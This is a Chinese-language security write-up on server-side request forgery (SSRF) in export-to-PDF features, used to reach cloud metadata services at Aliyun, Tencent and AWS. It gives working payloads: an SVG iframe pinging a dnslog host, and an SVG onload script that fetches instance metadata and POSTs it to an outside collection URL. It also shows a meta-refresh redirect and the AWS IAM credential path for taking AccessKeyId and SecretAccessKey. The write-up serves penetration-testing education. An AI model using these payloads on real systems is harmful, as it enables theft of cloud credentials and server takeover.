0x00 前言
=======

文章开始前我们先讲述一下metadata service，也就是云服务器的元数据，每个云服务器厂商都有元数据，只是获取的接口地址不同，获取到的内容也不一样，有些元数据中是可以获取到登录凭证，可以直接接管服务器。由于元数据只能在云服务器上请求特定地址才能获取到，所以也常常用来作为ssrf利用方式的一种。

0x01 metadata service
=====================

阿里云
---

URL：<http://100.100.100.200>

基本实例元数据项，就不做展示了，感兴趣的可以查看下官方文档https://help.aliyun.com/document\_detail/214777.htm?spm=a2c4g.11186623.0.0.777a4a07R5OHxw#concept-2078137

动态实例元数据项

|  |  |  |
|---|---|---|
| **数据项** | **说明** | **示例** |
| /dynamic/instance-identity/document | 实例标识文档，用于提供实例的身份信息，包括实例ID、IP地址等。 | {"zone-id":"cn-hangzhou-i","serial-number":"4acd2b47-b328-4762-852f-99\*\*\*\*","instance-id":"i-bp13znx0m0me8cq\*\*\*\*","region-id":"cn-hangzhou","private-ipv4":"192.168.XX.XX","owner-account-id":"1609\*\*\*\*","mac":"00:16:3e:0f:XX:XX","image-id":"aliyun\_3\_x64\_20G\_alibase\_20210425.vhd","instance-type":"ecs.g6e.large"} |
| /dynamic/instance-identity/pkcs7 | 实例标识签名，供其他方验证实例标识文档的真实性和内容。 | MIIDJwYJKoZIhvcNAQcCoIIDGDCCAxQCAQExCzAJBgUrDgMCGgUAMIIBYQYJKoZIhvcNAQcBoIIBUgSCAU57InpvbmUtaWQiOiJjbi1oYW5nemhvdS1oIiwic2VyaWFsLW\*\*\*\* |

腾讯云
---

URL：<http://metadata.tencentyun.com/latest/meta-data/>

能够获取的信息比较少，可以查看下官方文档https://cloud.tencent.com/document/product/213/4934

AWS
---

URL：<http://169.254.169.254/latest/meta-data/>

访问http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/

可以直接获取AccessKeyId和SecretAccessKey

官方文档https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html

0x02 导出功能SSRF测试
===============

1、有些网站存在功能，能够将一些将数据分析的表格导出为pdf或者图片，如下POST数据包，html文件就是我们要导出的内容，而这里存在ssrf漏洞

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f0271dc9c115d77f626a5558295ec87a69d690ad.png)

2、我们将html内容修改为

`<svg><iframe src="[http://123312.h41t0y.dnslog.cn"](http://123312.h41t0y.dnslog.cn") width=" " height=" "/></svg>`

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-74975a836a1015a3a6a31142af0faa5270abdb90.png)

可以看到成功触发了dnslog请求，说明此处是存在SSRF漏洞的。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-0eca7beff0294aa789e9251c06a52b68070c3c1f.png)

0x03 SVG SSRF
=============

由于 SVG 的功能十分丰富，所以能够处理SVG 的服务器就很有可能遭受到 SSRF、XSS、RCE 等的攻击，特别是在没有禁用一些特殊字符的情况下。

GitHub上有个大佬整理了丰富的svg攻击payload

<https://github.com/allanlw/svg-cheatsheet>

我们可以利用如下payload去获取metadata service中的数据信息。

首先加载一个可以远程获取到的图片，加载成功后，会触发onload事件 ；

使用 Fetch API接口，将元数据信息在存储到“params”参数中；

服务器向URL地址发起携带params的POST请求，这样我们就可以在历史数据包中找到我们想要的元数据信息了。

同理此方法也可以获取其他想要的数据信息。

```php
<svg width="100%" height="100%" viewBox="0 0 100 100" 
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://www.baidu.com/img/flexible/logo/pc/result@2.png" height="20" width="20" onload="fetch('http://metadata.tencentyun.com/latest/meta-data/').then(function (response) {
response.text().then(function(text) {
var params = text;
var http = new XMLHttpRequest();
var url = 'https://xxxxxxxxxxxxxxxx/';
http.open('POST', url, true);
http.send(params);
})});" />
</svg>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-89ebded150ffbfe0c308c745861c65fa26319a1f.png)

0x04 meta refresh
=================

利用：
---

当一些特殊标签比如&lt;svg&gt;,&lt;Iframe&gt;等被禁用后，我们可以使用&lt;meta&gt;0秒刷新请求元数据，以下为具体payload

```php
<meta http-equiv="refresh" content="0;url=http://metadata.tencentyun.com/latest/meta-data" />
```

那么目标服务器的metadata信息就会打印在输出的PDF文件上

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-da1d606f9eff5867571d31bf12bffc634e45a908.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f0aacaeacf315464c0cb5eb51b94a6ab6293238e.png)

拓展
--

应用程序导出数据为PDF或图片，会产生ssrf的原因，我认为是后端在处理数据的时候，没有进行过滤，导致了恶意代码的运行，那么我们在任意文件上传的漏洞，是不是可以直接上传svg文件，达到一些命令执行的效果呢

参考
--

<https://github.com/allanlw/svg-cheatsheet>

<https://infosecwriteups.com/svg-ssrfs-and-saga-of-bypasses-777e035a17a7>

<https://twitter.com/kunalp94/status/1502527605836173312>